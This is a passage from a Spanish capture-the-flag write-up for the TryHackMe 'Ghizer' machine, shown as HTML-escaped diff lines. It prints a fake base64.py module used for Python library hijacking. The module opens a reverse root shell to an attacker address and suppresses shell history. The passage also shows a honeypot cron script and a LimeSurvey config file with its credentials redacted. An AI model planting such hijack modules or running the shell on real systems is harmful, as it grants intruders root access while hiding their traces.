+&lt;p&gt;Creamos el archivo &lt;code&gt;base64.py&lt;/code&gt; en donde colocamos una shell inversa para realizar &lt;a href=&#34;https://rastating.github.io/privilege-escalation-via-python-library-hijacking/&#34;&gt;&lt;strong&gt;Python Library Hijacking&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pty&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;lhost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.10.10.10&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;lport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1337&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;ZIP_DEFLATED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;ZipFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
+
+    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
+
+    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lhost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;putenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HISTFILE&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/dev/null&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;pty&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;spawn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ejecutamos el script con python3 y sudo, ponemos a la escucha netcat en nuestra maquina y logramos obtener una shell con usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-59-33.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;honeypot---ftp&#34;&gt;HONEYPOT - FTP&lt;/h3&gt;
+&lt;p&gt;Al parecer el servicio FTP expuesto en la maquina es un honeypot llamado &lt;a href=&#34;https://github.com/Kirari-Senpai/Lucrecia.git&#34;&gt;&lt;strong&gt;Lucrecia&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_03-02-18.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Además el cron que encontramos era para ejecutar el honeypot.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@ubuntu:/root/Lucrecia# cat lucre.sh
+cat lucre.sh
+ufw disable
+sleep &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
+python3 lucrecia.py -f server.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;task-1&#34;&gt;TASK 1&lt;/h2&gt;
+&lt;p&gt;Al obtener una shell es posible obtener las credenciales en &amp;hellip;&lt;br /&gt;
+&lt;div class=&#34;alert alert-danger&#34; role=&#34;alert&#34; data-dir=&#34;ltr&#34;&gt;&lt;strong&gt;SPOILER&lt;/strong&gt;&lt;/div&gt;
+&lt;/p&gt;
+&lt;div class=&#34;expand&#34;&gt;
+  &lt;button type=&#34;button&#34; class=&#34;expand__button&#34; aria-label=&#34;Expand Button&#34;&gt;
+    &lt;span class=&#34;expand-icon expand-icon__right&#34;&gt;
+        &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;24&#34; height=&#34;24&#34; viewBox=&#34;0 0 24 24&#34;&gt;&lt;path fill=&#34;currentColor&#34; d=&#34;M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z&#34;/&gt;&lt;/svg&gt;
+    &lt;/span&gt;
+    SOPOILER
+  &lt;/button&gt;
+  &lt;div class=&#34;expand__content&#34;&gt;
+    &lt;p&gt;&lt;code&gt;limesurvey/application/config&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;veronica@ubuntu:/var/www/html/limesurvey/application/config$ cat config.php
+cat config.php
+&amp;lt;?php &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!defined&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;BASEPATH&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; exit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;No direct script access allowed&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+/*
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; -------------------------------------------------------------------
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; DATABASE CONNECTIVITY SETTINGS
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; -------------------------------------------------------------------
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; This file will contain the settings needed to access your database.
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; For &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt; instructions please consult the &lt;span class=&#34;s1&#34;&gt;&amp;#39;Database Connection&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; page of the User Guide.
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; -------------------------------------------------------------------
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; EXPLANATION OF VARIABLES
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; -------------------------------------------------------------------
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;connectionString&amp;#39;&lt;/span&gt; Hostname, database, port and database &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     the connection. Driver example: mysql. Currently supported:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                 mysql, pgsql, mssql, sqlite, oci
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt; The username used to connect to the database
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; The password used to connect to the database
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;tablePrefix&amp;#39;&lt;/span&gt; You can add an optional prefix, which will be added
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                 to the table name when using the Active Record class
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+*/
+&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; array&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
+	&lt;span class=&#34;s1&#34;&gt;&amp;#39;components&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; array&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; 
+		&lt;span class=&#34;s1&#34;&gt;&amp;#39;db&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; array&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
+			&lt;span class=&#34;s1&#34;&gt;&amp;#39;connectionString&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;mysql:host=localhost;port=3306;dbname=limedb;&amp;#39;&lt;/span&gt;,
+			&lt;span class=&#34;s1&#34;&gt;&amp;#39;emulatePrepare&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; true,
+			&lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;[... REDACTED ...]&amp;#39;&lt;/span&gt;,
+			&lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;[... REDACTED ...]&amp;#39;&lt;/span&gt;,
+			&lt;span class=&#34;s1&#34;&gt;&amp;#39;charset&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8mb4&amp;#39;&lt;/span&gt;,
+			&lt;span class=&#34;s1&#34;&gt;&amp;#39;tablePrefix&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;lime_&amp;#39;&lt;/span&gt;,
+		&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
+		
+		// Uncomment the following lines &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you need table-based sessions.
+		// Note: Table-based sessions are currently not supported on MSSQL server.
+		// &lt;span class=&#34;s1&#34;&gt;&amp;#39;session&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
+			// &lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;application.core.web.DbHttpSession&amp;#39;&lt;/span&gt;,
+			// &lt;span class=&#34;s1&#34;&gt;&amp;#39;connectionID&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;db&amp;#39;&lt;/span&gt;,
+			// &lt;span class=&#34;s1&#34;&gt;&amp;#39;sessionTableName&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;{{sessions}}&amp;#39;&lt;/span&gt;,
+		// &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
+		
+		&lt;span class=&#34;s1&#34;&gt;&amp;#39;urlManager&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; array&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
+			&lt;span class=&#34;s1&#34;&gt;&amp;#39;urlFormat&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;,
+			&lt;span class=&#34;s1&#34;&gt;&amp;#39;rules&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; array&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
+				// You can add your own rules here
+			&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
+			&lt;span class=&#34;s1&#34;&gt;&amp;#39;showScriptName&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; true,
+		&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
+	
+	&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
+	// For security issue : it&lt;span class=&#34;s1&#34;&gt;&amp;#39;s better to set runtimePath out of web access
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	// Directory must be readable and writable by the webuser
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	// &amp;#39;&lt;/span&gt;runtimePath&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;gt;&amp;#39;&lt;/span&gt;/var/limesurvey/runtime/&lt;span class=&#34;s1&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	// Use the following config variable to set modified optional settings copied from config-defaults.php
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	&amp;#39;&lt;/span&gt;config&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;gt;array(
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	// debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	// then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	// on your webspace.
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	// LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		&amp;#39;&lt;/span&gt;debug&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;gt;0,
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		&amp;#39;&lt;/span&gt;debugsql&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt;0, // Set this to &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; to enanble sql logging, only active when &lt;span class=&#34;nv&#34;&gt;debug&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
+		// Update default LimeSurvey config here
+	&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+/* End of file config.php */
+/* Location: ./application/config/config.php */
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;h2 id=&#34;task-2&#34;&gt;TASK 2&lt;/h2&gt;
